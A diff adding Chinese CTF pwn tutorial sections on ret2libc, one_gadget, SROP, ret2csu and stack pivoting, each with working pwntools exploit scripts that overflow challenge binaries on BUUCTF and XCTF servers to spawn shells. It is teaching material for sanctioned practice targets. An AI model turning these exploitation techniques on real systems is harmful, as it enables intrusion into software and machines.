@@ -1414,4 +1414,918 @@ if __name__ == "__main__":
     main()
 ```
 
-#### 例题[OGeek2019]babyrop
+#### 例题 3：[OGeek2019]babyrop
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#[OGeek2019]babyrop)
+
+※ hint：输入的第 8 个数会被当成什么？
+
+依旧 32 位，大概意思是会拿输入的数和一个随机数进行比对，如果错了直接退出程序，但是依旧 `strlen()` 比对，所以前加 `\x00` 跳过它。
+
+然后拿输入的第 8 个数，`bufa[7]` 当作函数的返回值，传到第二个函数里当 `read()` 的长度限制，所以我们输入 `\xFF` 超长长度。
+
+然后就开始 ret2libc 爽吃。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 28281
+io = remote(host,port)
+# io = process('./pwn')
+elf = ELF('./pwn')
+
+offset = 235
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+main_addr = 0x8048825
+payload_1 = b'\x00' + b'A'*6 + b'\xFF'  # '\x00' 截断字符比对，'\xFF' 使函数返回值为 255
+
+def main():
+    io.sendline(payload_1)
+    io.recvuntil(b"Correct\n")
+    payload_2 = b'A'*offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
+    io.sendline(payload_2)
+    leak_data = io.recvn(4)
+    write_addr = u32(leak_data)
+    print(hex(write_addr))  # 0xf7e233c0 → libc6_2.23-0ubuntu11.3_i386
+    libc = write_addr - 0xd43c0
+    system = libc + 0x3a940
+    binsh = libc + 0x15902b
+    payload_3 = b'A'*offset + p32(system) + p32(main_addr) + p32(binsh)
+    io.sendline(payload_1)
+    io.recvuntil(b"Correct\n")
+    io.sendline(payload_3)
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 题单
+
+没有区分特点的题单，零基础可以做做。
+
+[[HarekazeCTF2019]baby_rop2](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2)
+
+[jarvisoj_level4](https://buuoj.cn/challenges#jarvisoj_level4)
+
+[pwn2_sctf_2016](https://buuoj.cn/challenges#pwn2_sctf_2016)
+
+[bjdctf_2020_babyrop](https://buuoj.cn/challenges#bjdctf_2020_babyrop)
+
+[铁人三项(第五赛区)_2018_rop](https://buuoj.cn/challenges#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA)_2018_rop)
+
+## one_gadget
+
+其实算一个必须知道的小技巧，不是很大的知识点（大概）
+
+one_gadget 是 glibc 库里一个非常特殊的代码片段，仅调用单个地址就可以直接获得 shell，其实伪代码可以简单理解为：
+
+```
+void magic_gadgets(){
+	if (constraints_satisfied){//约束条件检查
+		execve("/bin/sh",0,0);
+		exit(0);
+	}
+}
+```
+
+使用 one_gadget 工具，可以对 libc 文件扫描算出所有的这些现成的、直接能拿 Shell 的代码片段，**距离 libc 基址的相对偏移量**。（也就是说我们首先要 ret2libc）
+
+在以下三种情况中可以尝试使用 one_gadget:
+
+* 溢出空间极其狭小：如果题目只能覆盖 old rbp 和 返回地址，那么纯 ROP 链就不太合适了，可以尝试使用 one_gadget。
+
+* 缺少关键的 Gadget 寄存器：如果 ROPgadget 工具找不到 `pop rdi;ret` 这种至关重要的寄存器，或者缺少 system 函数时。
+
+* 栈环境被严格限制： 遇到沙箱（Sandbox）或者某些严苛的代码审查，传统 ROP 链会被拦截，而 One Gadget 直接在 libc 内部跳转，隐蔽性极强。
+
+### 使用技巧
+
+one_gadget 通常有 Constraints（约束条件）。
+
+例如：
+
+* `rax == NULL` （跳转过去的瞬间，rax 寄存器必须是 0）
+
+* `[rsp+0x30] == NULL` （跳转过去的瞬间，栈顶往下 0x30 的位置必须是 0）
+
+* `r12 == NULL` 等等...
+
+一般使用时，要么刻意构造（如 在特定位置 [rsp+0x30] 处写入 0），要么前置 gadget 铺垫（如 `xor rax rax;ret` 使 rax 等于 0），要么 **玄学抽卡**（一个个暴力试哈哈）
+
+#### 例题 1：ciscn_2019_c_1
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_c_1)
+
+<img width="880" height="485" alt="image" src="https://github.com/user-attachments/assets/b1d9274b-982b-4c3b-bfae-9e7a06d3fd88" />
+
+这个题在 ret2libc 里正常做法，下面是 one_gadget 做法，更加简洁：
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 26565
+io = remote(host,port)
+elf = ELF("./ciscn_2019_c_1")
+libc = ELF("./libc-2.27.so")
+offset = 0x57
+padding = b'\0' + b"A"*offset
+pop_rdi_ret = 0x400c83
+ret = 0x400c84
+encrypt = 0x4009A0
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+payload_1 = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt)
+
+def main():
+    io.recvuntil(b"Input your choice!\n")
+    io.sendline(b"1")
+    io.recvuntil(b"Input your Plaintext to be encrypted\n")
+    io.sendline(payload_1)
+    puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))    
+    print(hex(puts_addr))   # 0x7f32720c99c0 → libc6_2.27-3ubuntu1_amd64
+    libc_base = puts_addr - libc.sym['puts']
+    one_gadget_offset = 0x4f322
+    one_gadget = libc_base + one_gadget_offset
+    payload_2 = b'\0' + b'A'*offset + p64(one_gadget)
+    io.recvuntil(b"Input your Plaintext to be encrypted\n")
+    io.sendline(payload_2)
+    io.interactive()
+    
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## SROP
+
+当我们做 ROP 题目时，偶尔发现找 `pop rdi; ret` 很容易，但是找 `pop rdx; ret` 往往不简单。
+
+如果题目**可用的 gadget 少的可怜**，以及可能**根本没有在系统库的函数 got 表**。，我们传统的 ROP 就不可用了，需要考虑 SROP。
+
+SROP (Sigreturn Oriented Programming) 是一种非常强大 ROP 的变种，它使一次性控制所有的 CPU 寄存器成为可能。
+
+### Unix 的 signal 处理
+
+在 unix 和 linux 中，当进程收到一个信号，内核会暂停当前程序的执行，转而去执行信号处理函数。
+
+在这个“上下文切换”的过程中，内核为了保证处理完信号后能恢复原状，会把当前 CPU 里所有的寄存器状态（rax, rdi, rsi, rip, rsp 等等）一股脑地全部压入栈中。
+
+这块保存在栈上的数据结构，被称为 Signal Frame（信号帧）。
+
+当信号处理函数执行完毕后，程序会调用一个特殊的系统调用：`sys_sigreturn`，从栈上把那个 Signal Frame 里的数据原封不动地弹回各个寄存器中，恢复现场。
+
+### 攻击步骤
+
+**`sys_sigreturn` 会盲目地相信 SigFrame 数据，并把它们塞进寄存器。**
+
+首先 `syscall` 会检查 rax 所存储的系统调用号，比如当 `rax = 1` 执行 `sys_write`，当 `rax = 15` 执行 `sys_sigreturn`，当 `rax = 59` 执行 `execve`。
+
+（32 位和 64 位系统调用号不同，建议使用 `pwn constgrep -c` 查询）
+
+所以我们需要**在返回地址上放 `mov rax,15;ret`，后面放 `syscall;ret`，执行了 sigreturn，并在下一个放 SigFrame，就可以 SROP 劫持所有的寄存器。**
+
+值得一提的是，sigframe 的长度在 64 位系统中，pwntools 默认是 0xF8，并且 SigFrame 的前几个字节覆盖也不会对 SROP 的实际效果产生影响，它的前 8 个字符通常是 `uc_flags`，具体是什么不用管，总之执行 SROP 时不检查它。
+
+在攻击中，我们最后的目的往往是使得，
+
+```
+	frame2 = SigreturnFrame()
+    frame2.rax = constants.SYS_execve
+    frame2.rdi = binsh_addr
+    frame2.rsi = 0
+    frame2.rdx = 0
+#   frame2.rsp = 
+#	frame2.rbp = 
+    frame2.rip = syscall_ret
+```
+
+需要注意的是，我们的 frame.rip 必须指向 syscall 所在的某个地址，但是关于 `syscall` 与 `syscall;ret` 之间的选择，即如果只是执行 `sys_write` 之类的，后面还要继续 ROP 的，那就要选 `syscall;ret`，而直接 getshell 的则是两种皆可。
+
+能够正确执行，其中难点在于找到 binsh_addr，为了使得 binsh 被写在栈的一个确定的位置，我们通常有几个方案：
+
+* 方案 1 ：第一次 SROP 把栈强行迁移到固定地址的 bss 段（NO PIE）
+* 方案 2 ：先泄露栈上的某个地址，然后动态调试得到 rsp 到泄露的栈的地址的偏移（通常本机和远端的偏移有一定差距）
+* 方案 3 ：先泄露栈上的某个地址，然后栈迁移使 binsh 被写在一个确定的位置。
+
+#### 例题 1：ciscn_2019_s_3
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_s_3)
+
+※ hint：朴素的 SROP。
+
+全是 sys_write 一类，没有 GOT 表，这也是我们不能用 ret2libc 的原因。
+
+而 gadgets 函数已经暗示的很明显，就是 SROP。
+
+如果我们用动态调试找一下 rsp 到泄露的栈的偏移，会发现 wsl 应该是 0x148，远端却是 0x110。
+
+这往往是因为我们 wsl 或者虚拟机的环境变量更多导致的。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 28445
+io = remote(host,port)
+# io = process("./ciscn_s_3")
+elf = ELF("./ciscn_s_3")
+vuln_addr = 0x4004ed
+syscall = 0x400517
+mov_rax_15_ret = 0x4004da
+
+payload_1 = b'/bin/sh\x00' + b'A'*8 + p64(vuln_addr)
+# 没有 pop rbp 直接 retn，所以 padding 长度为 0x10
+
+def main():
+    io.sendline(payload_1)
+    # gdb.attach(io,"b *0x400517\nc")    # vuln 函数中执行 syscall 的指令地址
+    # pause()
+    io.recv(0x20)   # payload_1 + saved_rbp
+    stack_leak = u64(io.recv(8))  # 泄露的栈上的地址
+    binsh = stack_leak - 0x118    # 本地 0x148，靶机通常在 0x110 左右
+    frame = SigreturnFrame()
+    frame.rax = 59              # sys_execve
+    frame.rdi = binsh           # 指向 /bin/sh
+    frame.rsi = 0
+    frame.rdx = 0
+    frame.rip = syscall         # 恢复现场后，去执行 syscall
+    payload_2 = b'/bin/sh\x00' + b'A'*8 + p64(mov_rax_15_ret) + p64(syscall) + bytes(frame)
+    io.sendline(payload_2)
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+所以我更推荐把栈迁移到 .bss 段的写法：
+
+```
+# written by Sonnety
+from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+
+
+# io = remote("node.buuoj.cn", 12345)
+io = process("./ciscn_s_3")
+elf = ELF("./ciscn_s_3")
+bss_addr = elf.bss() + 0x500 
+
+mov_rax_15_ret = 0x4004DA   # sigreturn
+syscall_ret = 0x400517
+
+def main():
+    frame1 = SigreturnFrame()
+    frame1.rax = constants.SYS_read
+    frame1.rdi = 0
+    frame1.rsi = bss_addr
+    frame1.rdx = 0x400
+    frame1.rsp = bss_addr
+    frame1.rip = syscall_ret
+
+    payload_1 = b'A' * 0x10 + p64(mov_rax_15_ret) + p64(syscall_ret) + bytes(frame1)
+    io.send(payload_1)
+    # 此时 rsp 指向我们设定的 bss 段    
+    io.recv(0x30)   # 程序会执行原本的 sys_write 吐出 0x30 字节垃圾数据，无视它
+    sleep(0.1)
+
+    binsh_addr = bss_addr + 0x108
+    
+    frame2 = SigreturnFrame()
+    frame2.rax = constants.SYS_execve
+    frame2.rdi = binsh_addr
+    frame2.rsi = 0
+    frame2.rdx = 0
+    frame2.rip = syscall_ret
+    
+    payload_2 = p64(mov_rax_15_ret) + p64(syscall_ret) + bytes(frame2)
+    payload_2 = payload_2.ljust(0x108, b'\x00') + b'/bin/sh\x00'
+    
+    io.send(payload_2)
+    
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 例题 2：360chunqiu2017_smallest
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#360chunqiu2017_smallest)
+
+※ hint：`read()`会返回读入字符的长度，而程序在调用 call 之后的返回值一般是保存在 rax 中的。
+
+64位程序，只开启了NX保护，程序非常简单，纯纯毛坯房，没有 bss 段。
+
+<img width="1087" height="197" alt="image" src="https://github.com/user-attachments/assets/387bd309-de16-4c44-bc64-2f026f7bdbd2" />
+
+Phase 1：泄露栈地址
+
+`payload_1 = p64(start) * 3`
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `0x0` | `start` | `<- ret` |
+| `0x8` | `start` |  |
+| `0x10` | `start` |  |
+
+第一次读入结束，ret start 再读入，rsp 下移 8 位。
+
+`payload_2 = '\xB3', rax=1 (sys.write)`
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `0x8` | `0x4000B3` | `<- ret` |
+| `0x10` | `0x4000B0` |  |
+
+第二次读入结束，ret 0x4000B3，rsp 下移 8 位，跳过了 `xor     rax, rax`，直到执行到 syscall：
+
+`edx = 0x400, rsi = rsp, rdi = rax = 1`
+syscall 执行 `sys.write(1, rsp, 0x400)`
+
+此时输出的前 8 个字节是 0x10 处的 0x4000B0，第 9 到 16 个字节是 0x18 处的栈地址，记为 stack_addr.
+
+---
+
+Phase 2：第一次 SROP (准备栈迁移)
+
+ret start再读入，rsp下移 8位。
+
+`payload_3 = p64(start) + b'A'*8 + bytes(frame1)`
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `0x18` | `0x4000B0` | `<- ret` |
+| `0x20` | `AAAAAAAA` |  |
+| `0x28` | `frame1` |  |
+| `.....` |  |  |
+
+这里填 8 个 A 给 syscall 留位置，方便下一次输入 15 个字符，使 `rax = 15` 执行 sigreturn。
+
+---
+
+Phase 3：触发第一次 SROP
+
+ret start再读入，rsp 下移 8 位指向 `0x20`。
+
+`sigreturn = p64(syscall_ret) + b'\x00'*7`, `rax=15`, 触发 sigreturn.
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `0x20` | `syscall` | `<- rsp` |
+| `0x28` | `frame1` |  |
+| `.....` |  |  |
+
+*(frame1 前 7 个字节被覆盖为 `\x00`，但不影响).*
+```
+	frame1 = SigreturnFrame()
+    frame1.rax = constants.SYS_read
+    frame1.rdi = 0
+    frame1.rsi = stack_addr
+    frame1.rdx = 0x400
+    frame1.rsp = stack_addr
+    frame1.rip = syscall_ret
+```
+---
+
+Phase 4 & 5：在受控栈上构造第二次 SROP
+
+触发 sigreturn 后，rsp 被改为 stack_addr，并执行 `read(0, stack_addr, 0x400)`
+
+这样我们 binsh 所写的位置就已知并且可控了。
+
+```
+	frame2 = SigreturnFrame()
+    frame2.rax = constants.SYS_execve
+    frame2.rdi = binsh_addr
+    frame2.rsi = 0
+    frame2.rdx = 0
+    frame2.rip = syscall_ret
+```
+
+
+`payload_4 = p64(start) + b'B'*8 + bytes(frame2)`
+
+`payload_4 = payload_4.ljust(0x300, b'\x00') + b'/bin/sh\x00'`
+
+`binsh = stack_addr + 0x300`
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `stack_addr` | `0x4000B0` |  |
+| `stack_addr + 0x08` | `BBBBBBBB` |  |
+| `stack_addr + 0x10` | `sigframe` |  |
+| `.....` | `00000000` |  |
+| `stack_addr + 0x300` | `/bin/sh` |  |
+
+---
+
+
+最后再 ret start 重新读入，rsp 向下移 8 位，`sigreturn = p64(syscall_ret) + b'\x00'*7` 执行 execve。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 27847
+io = remote(host,port)
+# io = process("./smallest")
+start = 0x4000B0
+syscall_ret = 0x4000BE
+
+
+def main():
+    payload_1 = p64(start)*3
+    io.send(payload_1)
+    sleep(0.1)
+    
+    payload_2 = b'\xB3'         # 跳过 rax xor rax,并使 rax = 1
+    # 执行 mov rdi,rax 后 ,rdi = 1(stdout)
+    io.send(payload_2)
+    # 执行 syscall，变成 sys_write(1,rsp,0x400)
+    leak_data = io.recv(0x400)
+    stack_addr = u64(leak_data[8:16]) # 前八个字节是我们填入的 start
+    stack_addr = stack_addr - 0x2000        # 内存过高，防止越界，向下放一点
+    print(hex(stack_addr))
+    frame1 = SigreturnFrame()
+    frame1.rax = constants.SYS_read
+    frame1.rdi = 0
+    frame1.rsi = stack_addr
+    frame1.rdx = 0x400
+    frame1.rsp = stack_addr
+    frame1.rip = syscall_ret
+
+    payload_3 = p64(start) + b'A'*8 + bytes(frame1)
+    io.send(payload_3)
+    sleep(0.1)
+
+    sigreturn = p64(syscall_ret) + b'\x00'*7
+    io.send(sigreturn)
+    sleep(0.1)
+
+    binsh = stack_addr + 0x300
+    frame2 = SigreturnFrame()
+    frame2.rax = constants.SYS_execve
+    frame2.rdi = binsh
+    frame2.rsi = 0
+    frame2.rdx = 0
+    frame2.rip = syscall_ret
+
+    payload_4 = p64(start) + b'B'*8 + bytes(frame2)
+    payload_4 = payload_4.ljust(0x300,b'\x00') + b'/bin/sh\x00'
+    io.send(payload_4)
+    sleep(0.1)
+    io.send(sigreturn)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 题单
+
+没有区分特点的题单，零基础可以做做。
+
+我 SROP 的题也没见多少，haha。
+
+BUU CTF：
+
+[ciscn_2019_es_7](https://buuoj.cn/challenges#ciscn_2019_es_7)
+
+[rootersctf_2019_srop](https://buuoj.cn/challenges#rootersctf_2019_srop)（※ hint：有 leave，所以第一次 SROP 要设置一个安全的栈底）
+
+---
+
+## Ret2csu
+
+大号的 ROP 链。
+
+在很多没有 puts 或者 printf，只有 read 和 write 可以利用的程序中，我们必须控制 rdi，rsi，rdx（或 ebx，ecx，edx）三个寄存器，往往 `pop rdi;ret` 和 `pop rsi,r15;ret` 是平凡的，但是 `pop rdx;ret` 未必会有。
+
+Ret2csu 通常用来解决这个问题。
+
+### 实现原理
+
+在大多数动态链接的程序中，往往存在一个名为 `__libc_csu_init` 的片段，形似：
+
+<img width="1214" height="424" alt="image" src="https://github.com/user-attachments/assets/03d52d23-7f30-456c-84fb-d9d7d5e999f4" />
+
+其在 IDA 中也不一定就在 Function name 栏里，**我们可以通过 ROPgadget 搜索 `pop r15,ret` 来寻找它。**
+
+为了方便这里称上面的片段叫 csu_mov，下面的叫 csu_pop。
+
+通过跳转到 csu_pop 我们可以控制大量的寄存器，然后 ret 跳转到 csu_mov，按照一一对应的可以控制：
+
+* `r13 ← rdx`
+* `rsi ← r14`
+* `edi ← r15d`
+* `call ← r12+rbx*8` **（执行 r12+rbx*8 地址指向的地址，如 `r12 = write_got,rbx = 0` 会执行 write，但是写 write 的真实地址就不执行）**
+
+因为 `add rbx,1`，我们为了方便初始使 `rbx = 0,rbp = 1`，那么这里 rbx = rbp，`cmp     rbx, rbp` 使 ZF = 1，jnz 不跳转。
+
+然后顺序执行第二次 csu_pop，这里随便垫掉 pop，触发 ret。
+
+#### 例题 1：[LCTF2016]pwn100
+
+[攻防世界 题目链接](https://adworld.xctf.org.cn/challenges/list)
+
+※ hint：平凡的 ret2libc，硬练 ret2csu。
+
+自己搜一下 pwn-100.
+
+其实这个题本身是非常平凡的 ret2libc，因为它同时有 `pop rdi;ret` 和 `puts`。
+
+但是我被 gemini 骗了。它说这道题是 ret2csu 的经典题目。
+
+总之来都来了。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "61.147.171.105"
+port = 60199
+io = remote(host,port)
+# io = process("./pwn100")
+elf = ELF("./pwn100")
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+read_got = elf.got['read']
+main_addr = 0x4006B8
+csu_pop = 0x40075A
+csu_mov = 0x400740
+pop_rdi_ret = 0x400763
+
+def main():
+    # payload_1 = b'A'*0x48 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+    payload_1 = b'A'*0x48 + p64(csu_pop)
+    payload_1 += p64(0)   # rbx
+    payload_1 += p64(1)   # rbp
+    payload_1 += p64(puts_got)    # r12+rbx*8 → call
+    payload_1 += p64(0)           # r13 → rdx
+    payload_1 += p64(0)           # r14 → rsi
+    payload_1 += p64(puts_got)    # r15 → edi
+    payload_1 += p64(csu_mov)
+    payload_1 += b'B'*0x38 + p64(main_addr)
+    payload_1 = payload_1.ljust(200,b'\x00')
+    io.send(payload_1)
+    io.recvline()
+    leak_data = io.recvline().strip(b'\n').ljust(8,b'\x00')
+    # print("\n[*] DEBUG : Leak data = ",leak_data)
+    puts_addr = u64(leak_data)
+    print("\n[+] Leak puts address :",hex(puts_addr))
+    libc_base = puts_addr - 0x06f690
+    print("\n[+] Leak libc base address :",hex(libc_base))
+    system = libc_base + 0x045390
+    print("\n[+] Leak system address :",hex(system))
+    binsh = libc_base + 0x18cd57
+    print("\n[+] Leak /bin/sh address :",hex(binsh))
+    payload_2 = b'A'*0x48 + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
+    payload_2 = payload_2.ljust(200,b'\x00')
+    io.send(payload_2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 例题 2：ciscn_2019_s_3
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_s_3)
+
+※ hint：rdi = binsh，rsi = 0，rdx = 0
+
+这道题本身是我们 SROP 的练手题，但是也是可以练 ret2csu 的。
+
+因为 execve("/bin/sh",0,0) 要控制 rdi = binsh，rsi = 0，rdx = 0，后面两个寄存器可以用 ret2csu 控制。
+
+因为输出长度是 0x30，可以泄露栈地址，那么我们就可以算出自己填的 binsh 地址。
+
+<img width="1509" height="401" alt="image" src="https://github.com/user-attachments/assets/3e87a064-a248-45b4-b221-b84287f8b837" />
+
+泄露栈到 rbp 是 0x9d8 - 0x8a0 = 0x138，加上 0x10 的 padding 就是 0x148。
+
+那么 ret2csu 控制各个寄存器即可。
+
+注意 ret2csu 的 call 是不能留空的，这里最好的方案是把 `mov rax 15;ret` 填到栈上，然后 call 它在栈上的地址。
+
+```
+# written by Sonnety
+from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+io = process("./ciscn_s_3")
+elf = ELF("./ciscn_s_3")
+csu_pop = 0x40059A
+csu_mov = 0x400580
+main_addr = elf.sym['main']
+pop_rdi_ret = 0x4005a3
+mov_rax_execve_ret = 0x4004E2
+syscall = 0x400501
+
+def main():
+    payload_1 = b'A'*0x18 + p64(main_addr)
+    # gdb.attach(io,"b 0x400519\nc")
+    # pause()
+    io.send(payload_1)
+    io.recvn(0x20)
+    leak_data = io.recvn(8)
+    leak_stack = u64(leak_data)
+    print("\n [+] Leak stack address :",hex(leak_stack))
+    binsh = leak_stack - 0x148
+    print("\n [+] Leak /bin/sh address :",hex(binsh))
+    payload_2 = b"/bin/sh\x00" + b'B'*0x10 + p64(csu_pop)
+    payload_2 += p64(0)       # rbx
+    payload_2 += p64(1)       # rbp
+    payload_2 += p64(binsh + 0x58)       # r12 → call
+    payload_2 += p64(0)       # r13 → rdx
+    payload_2 += p64(0)       # r14 → rsi
+    payload_2 += p64(0)       # r15 → edi
+    payload_2 += p64(csu_mov)
+    payload_2 += p64(mov_rax_execve_ret)
+    payload_2 += b'C'*0x38 + p64(pop_rdi_ret) + p64(binsh) + p64(syscall)
+    io.send(payload_2)
+    io.interactive()
+    
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 栈迁移
+
+在常规的栈溢出攻击中，通常会在覆盖了 ret 之后，继续写入长长的一串 ROP 链。
+
+但是当程序只给非常微小的溢出空间时，比如，输入缓冲区的溢出限制非常严格，只能刚好覆盖掉 ebp 和紧挨着的 ret。
+
+栈迁移正是为了解决这个问题而诞生的。
+
+既然当前的栈空间不够，那我们就把栈顶指针（ESP/RSP）挪到另一个我们能控制、且空间足够大的内存区域（如 bss 段），去那里执行 ROP 链。
+
+### 实现原理
+
+`leave;ret` 等效于 
+
+```
+mov rsp,rbp;
+pop rbp;
+pop rip;
+jmp rip
+```
+
+这里细化一下具体栈销毁流程。
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `0x0` | `padding` |  |
+| `0x8` | `padding` |  |
+| `0x10` | `padding` |  |
+| `0x18` | `old rbp` | 父函数rbp |
+| `0x20` | `rip address` | 函数调用结束后的下一条指令 |
+
+执行流要执行 leave 时，rsp 从原本的 0x0 位置跳到了 0x18 这个位置来，而中间的 padding 则被视为销毁。
+
+紧接着 pop rbp 则弹出了 old rbp 赋值给 rbp，恢复了父函数的 rbp，rsp 下移 8 位。
+
+下一步 pop rip 把函数调用后的下一条指令弹出给了 rip，最后函数返回父函数，子函数被销毁，最后状态恢复成了进子函数时的状态。
+
+对于栈迁移：
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `0x0` | `padding` |  |
+| `0x8` | `padding` |  |
+| `0x10` | `padding` |  |
+| `0x18` | `.bss address` | 伪造的栈地址 |
+| `0x20` | `下一个 leave;ret` |  |
+
+执行流执行 leave 时，销毁 padding，rbp 迁移到 bss 段上。
+
+执行流执行 ret 时，跳到下一个 `leave;ret` 上。
+
+此时，rsp 指向 0x28，rbp 指向 bss 段指定位置。
+
+下一个 leave，将 rbp 赋值给 rsp，**此时 rsp 也被强制迁移到了伪造的栈地址上**。
+
+假设我们在这个伪造的栈地址上已经放好了一些东西。
+
+| 地址 | 数据 | 备注 |
+| --- | --- | --- |
+| `0x80` | `无用数据` | 头部，最初rbp迁移到这里 |
+| `0x88` | `pop rdi;ret` |  |
+| `0x90` | `/bin/sh\x00` |  |
+| `0x98` | `system` |  |
+
+那么 pop rbp 会把头部的无用数据弹出给 rbp，**很可能这样的数据是无意义的甚至是一个不可读写的非法地址**，不过不用管。
+
+接着就是正常的 rop 链了。
+
+#### 例题 1：ciscn_2019_es_2
+
+※ hint：两个 printf 可以泄露栈地址。
+
+这道题给了两个 printf，可以泄露栈。
+
+<img width="2559" height="937" alt="image" src="https://github.com/user-attachments/assets/55c7a5dd-d58b-41e7-8f9a-06804323718c" />
+
+溢出给了 8 个字节，刚好够覆盖 ebp 和 eip。
+
+所以第一次 printf 肯定是泄露栈，然后 gdb 调试一下，找一下泄露的栈到输入的 ebp 的偏移。
+
+<img width="1746" height="851" alt="900f5a51aa2e6d0e8e2ad953bd8cfc25" src="https://github.com/user-attachments/assets/33758e9d-9426-4889-a52d-e5ce6997442f" />
+
+偏移是 0x38。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 29114
+io = remote(host,port)
+# io = process('./ciscn_2019_es_2')
+elf = ELF('./ciscn_2019_es_2')
+system = elf.plt['system']
+leave_ret = 0x8048562
+payload_1 = b'A'*0x24 + b"meow"
+
+def main():
+    io.recvuntil(b"Welcome, my friend. What's your name?\n")
+    io.send(payload_1)
+    io.recvuntil(b"meow")
+    leak_data = io.recvn(4)
+    leak_ebp = u32(leak_data)
+    print("Leaked EBP:", hex(leak_ebp))     # Leaked EBP: 0xffe14708
+    # gdb.attach(io)                        # 0xffe146d0
+    ebp = leak_ebp - 0x38
+    binsh = ebp + 0x10
+    payload_2 = b'A'*4 + p32(system) + p32(0) + p32(binsh) + b"/bin/sh\x00"
+    payload_2 = payload_2.ljust(0x28,b"\x00")
+    payload_2 = payload_2 + p32(ebp) + p32(leave_ret)
+    io.sendline(payload_2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 例题 2：[Black Watch 入群题]PWN
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN)
+
+※ hint：似乎有个全局变量。
+
+发现这个题有一个全局变量 s 可以写入，它写在 bss 段上，没有开 PIE，地址固定。
+
+<img width="2550" height="1002" alt="image" src="https://github.com/user-attachments/assets/210723ec-2a78-41e5-97c3-ea535c87461f" />
+
+于是我们可以考虑把 ROP 链写在 s 上，然而发现并没有 system。
+
+所以考虑第一次栈迁移，泄露 write 以 ret2libc，然后返回 main 函数，第二次栈迁移 getshell。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 26018
+io = remote(host,port)
+# io = process("./spwn")
+elf = ELF("./spwn")
+libc = ELF("./libc-2.23.so")
+main_addr = 0x8048513
+bss = 0x804A300
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+vuln = 0x804849B
+leave_ret = 0x8048511
+
+def main():
+    io.recvuntil(b"Hello good Ctfer!\n")
+    io.recvuntil(b"What is your name?")
+    payload_1 = b"meow" + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x400)
+    io.send(payload_1)
+    io.recvuntil(b"What do you want to say?")
+    go_bss = b'A'*0x18 + p32(bss) + p32(leave_ret)
+    io.send(go_bss)
+    leak_data = io.recvn(4)
+    write_addr = u32(leak_data)
+    print(hex(write_addr))      # 0xf7e8fb50
+    io.recvuntil(b"Hello good Ctfer!\n")
+    io.recvuntil(b"What is your name?")
+    libc_base = write_addr - libc.sym['write']
+    system = libc_base + libc.sym['system']
+    binsh = bss + 0x10
+    payload_2 = b"meow" + p32(system) + p32(0) + p32(binsh) + b"/bin/sh\x00"
+    io.send(payload_2)
+    # gdb.attach(io)
+    io.recvuntil(b"What do you want to say?")
+    io.send(go_bss)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 例题 3：gyctf_2020_borrowstack
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#gyctf_2020_borrowstack)
+
+※ hint：或许可以试试 one_gadget ?
+
+最初我认为她很普通。
+
+总之看起来和上一道题差不多，只不过上一道题是先输入到 bss 段，然后再触发栈溢出。
+
+这道题是先栈溢出，然后再输入到 bss 段，不过这一点其实没什么差别，栈溢出与栈偏移不是输入就即刻发生的，而是遇到 ret 之后再发生的。
